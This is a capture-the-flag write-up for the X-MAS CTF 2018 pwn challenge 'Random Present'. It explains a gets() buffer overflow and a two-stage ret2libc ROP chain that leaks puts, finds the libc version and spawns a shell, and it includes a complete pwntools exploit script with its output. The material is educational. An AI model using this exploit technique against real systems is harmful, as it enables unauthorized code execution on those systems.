# __XMAS-CTF 2018__ 
## _Random Present_

## Information
**Category:** | **Writeup Author**
--- | ---
Pwn | Huascar Tejeda <<htejeda@f2tc.com>>

**Description:** 

> Sometimes you just don't get what you desire...
>
> [chall](chall) 
>
> Author: littlewho

**Flag:**

> X-MAS{r4nd0m_chr157m45_pr353n75_4r3_50_fun}

## Solution

```
0x0000000000400676 <+0>:	push   rbp
0x0000000000400677 <+1>:	mov    rbp,rsp
0x000000000040067a <+4>:	sub    rsp,0x20
0x000000000040067e <+8>:	mov    edi,0x3c
0x0000000000400683 <+13>:	mov    eax,0x0
0x0000000000400688 <+18>:	call   0x400560 <alarm@plt>
0x000000000040068d <+23>:	mov    rax,QWORD PTR [rip+0x2009ac]
0x0000000000400694 <+30>:	mov    ecx,0x0
0x0000000000400699 <+35>:	mov    edx,0x2
0x000000000040069e <+40>:	mov    esi,0x0
0x00000000004006a3 <+45>:	mov    rdi,rax
0x00000000004006a6 <+48>:	call   0x400580 <setvbuf@plt>
0x00000000004006ab <+53>:	mov    rax,QWORD PTR [rip+0x20099e]
0x00000000004006b2 <+60>:	mov    ecx,0x0
0x00000000004006b7 <+65>:	mov    edx,0x2
0x00000000004006bc <+70>:	mov    esi,0x0
0x00000000004006c1 <+75>:	mov    rdi,rax
0x00000000004006c4 <+78>:	call   0x400580 <setvbuf@plt>
0x00000000004006c9 <+83>:	mov    rax,QWORD PTR [rip+0x200990]
0x00000000004006d0 <+90>:	mov    ecx,0x0
0x00000000004006d5 <+95>:	mov    edx,0x2
0x00000000004006da <+100>:	mov    esi,0x0
0x00000000004006df <+105>:	mov    rdi,rax
0x00000000004006e2 <+108>:	call   0x400580 <setvbuf@plt>
0x00000000004006e7 <+113>:	mov    edi,0x4007a0
0x00000000004006ec <+118>:	call   0x400550 <puts@plt>
0x00000000004006f1 <+123>:	mov    edi,0x4007c7
0x00000000004006f6 <+128>:	call   0x400550 <puts@plt>
0x00000000004006fb <+133>:	lea    rax,[rbp-0x20]
0x00000000004006ff <+137>:	mov    rdi,rax
0x0000000000400702 <+140>:	mov    eax,0x0
0x0000000000400707 <+145>:	call   0x400570 <gets@plt>
0x000000000040070c <+150>:	mov    eax,0x0
0x0000000000400711 <+155>:	leave  
0x0000000000400712 <+156>:	ret    
```

It's pretty clear what the program does and what we need to do in order to defeat this challenge. It is a buffer overflow caused by gets() in main().

1. puts("This is easier than you would think...")
```
0x00000000004006e7 <+113>:	mov    edi,0x4007a0
0x00000000004006ec <+118>:	call   0x400550 <puts@plt>
```

2. puts("Santa allowed you to ROP me!")
```
0x00000000004006f1 <+123>:	mov    edi,0x4007c7
0x00000000004006f6 <+128>:	call   0x400550 <puts@plt>
```

3. gets(buf) -- uh oh...
```
0x00000000004006fb <+133>:	lea    rax,[rbp-0x20]
0x00000000004006ff <+137>:	mov    rdi,rax
0x0000000000400702 <+140>:	mov    eax,0x0
0x0000000000400707 <+145>:	call   0x400570 <gets@plt>
```

#### Properties of the executable:
```
[f2tc@htejeda RandomPresent]$ checksec chall 
[*] '/home/f2tc/xmas-ctf/pwn/RandomPresent/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```
[f2tc@htejeda RandomPresent]$ objdump -R chall 

chall:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main
0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601040 R_X86_64_COPY     stdout
0000000000601050 R_X86_64_COPY     stdin
0000000000601060 R_X86_64_COPY     stderr
0000000000601018 R_X86_64_JUMP_SLOT  puts
0000000000601020 R_X86_64_JUMP_SLOT  alarm
0000000000601028 R_X86_64_JUMP_SLOT  gets
0000000000601030 R_X86_64_JUMP_SLOT  setvbuf
```


#### Strategy

In order to defeat this challenge we need the following:

1. Gain control over RIP
```
0x00000000004006fb <+133>:	lea    rax,[rbp-0x20]
0x00000000004006ff <+137>:	mov    rdi,rax
0x0000000000400702 <+140>:	mov    eax,0x0
0x0000000000400707 <+145>:	call   0x400570 <gets@plt>
```

**Buffer** | **SFP** | **RIP**
--- | --- | ---
"A" * 32 | "B"*8 | "C" * 6

```
gdb-peda$ r < <(python -c 'print "A"*32 + "B"*8 + "C"*6')
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0xfbad208b 
RDX: 0x7ffff7dd6a10 --> 0x0 
RSI: 0x7ffff7dd56c3 --> 0xdd6a10000000000a 
RDI: 0x0 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffe330 --> 0x2000000000 ('')
RIP: 0x434343434343 ('CCCCCC')
R8 : 0x7ffff7fe8740 (0x00007ffff7fe8740)
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400590 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe400 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x434343434343
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe330 --> 0x2000000000 ('')
0008| 0x7fffffffe338 --> 0x7fffffffe408 --> 0x7fffffffe640 ("/home/f2tc/xctf/Pwn/RandomPresent/./chall")
0016| 0x7fffffffe340 --> 0x100000000 
0024| 0x7fffffffe348 --> 0x400676 (<main>:	push   rbp)
0032| 0x7fffffffe350 --> 0x0 
0040| 0x7fffffffe358 --> 0x36ba87fc366fd5f3 
0048| 0x7fffffffe360 --> 0x400590 (<_start>:	xor    ebp,ebp)
0056| 0x7fffffffe368 --> 0x7fffffffe400 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000434343434343 in ?? ()
```

2. Build a Stage 1 ROP:
- Return to puts@plt to return puts()'s GOT entry
- Call main to execute Stage 2

```
rop.search(regs=["rdi"], order = "regs")
rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])
```

3. Use the leaked puts offset to find the libc used remotely

```
[*] Stage 1 ROP Chain
    0x0000:         0x40077b pop rdi; ret
    0x0008:         0x601018 [arg0] rdi = got.puts
    0x0010:         0x40054c puts
    0x0018:         0x400676 0x400676()
[DEBUG] Sent 0x49 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  7b 07 40 00  00 00 00 00  │AAAA│AAAA│{·@·│····│
    00000030  18 10 60 00  00 00 00 00  4c 05 40 00  00 00 00 00  │··`·│····│L·@·│····│
    00000040  76 06 40 00  00 00 00 00  0a                        │v·@·│····│·│
    00000049
[DEBUG] Received 0x6 bytes:
    00000000  60 a4 0e 50  08 7f                                  │`··P│··│
    00000006
```

```
[f2tc@htejeda libc-database]$ ./find puts a460
ubuntu-artful-amd64-libc6 (id libc6_2.26-0ubuntu2.1_amd64)
```


4. Subtract the leaked puts address with the libc puts address
```
libc.address = u64(leaked_puts) - libc.symbols['puts']
```
5. Get system() and "/bin/sh" offsets from libc and build the Stage 2 ROP

```
rop2.system(next(libc.search('/bin/sh')))
```

## Exploit
```python
from pwn import *

context(os='linux', arch='amd64')

p = process('./chall')

elf  = ELF("chall")
libc = ELF("./libc6_2.26-0ubuntu2.1_amd64.so")
rop  = ROP(elf)

#Stage 1
junk = "A" * 40 
rop.search(regs=["rdi"], order = "regs")
rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])

p.recvrepeat(1)

log.info("Stage 1 ROP Chain\n" + rop.dump())
stage1 = junk + str(rop)
p.sendline(stage1)

leaked_puts = p.recv()[:6].strip().ljust(8, '\x00')

#Stage 2
libc.address = u64(leaked_puts) - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('sh\x00')))

p.recvrepeat(1)

log.info("Stage 2 ROP Chain:\n" + rop2.dump())
stage2 = junk + str(rop2)
p.sendline(stage2)
p.interactive()
```

```
[f2tc@htejeda RandomPresent]$ ./exploit.py 
[+] Opening connection to 199.247.6.180 on port 10005: Done
[*] '/home/f2tc/xmas-ctf/pwn/RandomPresent/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/f2tc/xmas-ctf/pwn/RandomPresent/libc6_2.26-0ubuntu2.1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for 'chall'
[*] Stage 1 ROP Chain
    0x0000:         0x40077b pop rdi; ret
    0x0008:         0x601018 [arg0] rdi = got.puts
    0x0010:         0x40054c puts
    0x0018:         0x400676 0x400676()
[*] Loaded cached gadgets for '/home/f2tc/xmas-ctf/pwn/RandomPresent/libc6_2.26-0ubuntu2.1_amd64.so'
[*] Stage 2 ROP Chain:
    0x0000:   0x7f76ef9fe06b pop rdi; ret
    0x0008:   0x7f76efb81400 [arg0] rdi = 140148804686848
    0x0010:   0x7f76efa252a0 system
Sending again
[*] Switching to interactive mode
$ cat flag
X-MAS{r4nd0m_chr157m45_pr353n75_4r3_50_fun}
```